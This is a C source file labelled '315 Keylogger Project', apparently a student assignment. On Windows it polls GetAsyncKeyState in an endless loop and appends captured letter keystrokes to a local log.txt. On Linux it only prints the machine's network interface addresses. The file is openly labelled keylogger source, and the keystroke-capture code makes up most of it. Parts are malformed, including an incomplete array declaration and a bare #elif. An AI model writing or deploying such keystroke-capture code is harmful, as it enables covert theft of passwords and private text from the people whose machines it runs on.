// 315 Keylogger Project
#include <stdio.h>
#include <stdlib.h>

// If on linux
#if defined (__linux)
  #include <arpa/inet.h>
  #include <sys/socket.h>
  #include <netdb.h>
  #include <ifaddrs.h>
  #include <unistd.h>
  #include <linux/if_link.h>
  int main(int argc, char *argv[]){
    printf("Compiled on linux?\n");
    struct ifaddrs *ifaddr, *ifa;
    int family, s, n;
    char host[NI_MAXHOST];
    if(getifaddrs (&ifaddr) == -1){
        perror ("getifaddrs");
        exit (EXIT_FAILURE);
      }

    // Walk through linked list, maintaining head pointer so we can free list later
    for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++){
      if (ifa->ifa_addr == NULL){
        continue;
      }
      family = ifa->ifa_addr->sa_family;
      // For an AF_INET* interface address, display the address
      if (family == AF_INET || family == AF_INET6){
        s = getnameinfo (ifa->ifa_addr,(family == AF_INET) ? sizeof (struct sockaddr_in) : sizeof (struct sockaddr_in6), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
        printf ("address: <%s>\n", host);
      }
    }
    freeifaddrs(ifaddr);
    exit(EXIT_SUCCESS);
  }
// Windows - The main program
#elif defined (_WIN32)
  #include <Windows.h>
  #pragma comment(lib, "User32.lib")
  // Run main function

int vk_size = 2;
char vk_string[];

  int process_vKey(int vk){
    printf("Key pressed %c with number %i\n", vk, vk);

    //A-Z only
    if ( vk > 40 && vk < 90){
      vk_size = 2;
      return vk;
    }
    else{
      return 0;
    }
  }

  int main(){
    printf("Compiled on windows\n");

    int last_vKey = 0;
  	while (1){
  		for (int vKey = 30; vKey < 100; ++vKey)
  		{
  			if (GetAsyncKeyState(last_vKey) != 0)
  				continue;

  			last_vKey = vKey;
        // https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getasynckeystate
  			if (GetAsyncKeyState(vKey) != 0)
  			{
  				last_vKey = vKey;
          vKey = process_vKey(vKey);
  				FILE *f = NULL;
  				fopen_s(&f, "log.txt", "a+");
        /**  int *size = malloc(vk_size);
          printf("%i\n",*size);
          free(size);**/

  				char buffer[4];

          if (vKey != 0){
            printf("[*] Key processed: %c \n", vKey);
    				sprintf_s(buffer, sizeof(buffer), "%c", vKey);
    				fwrite(buffer, 1, 1, f);
          }

          fclose(f);
  			}
  		}
  	}
  }
#elif
    // If windows or linux is not defined
    int main(){
      printf("Error while compiling... incompatable os\n");
      exit(0);
    }

#endif
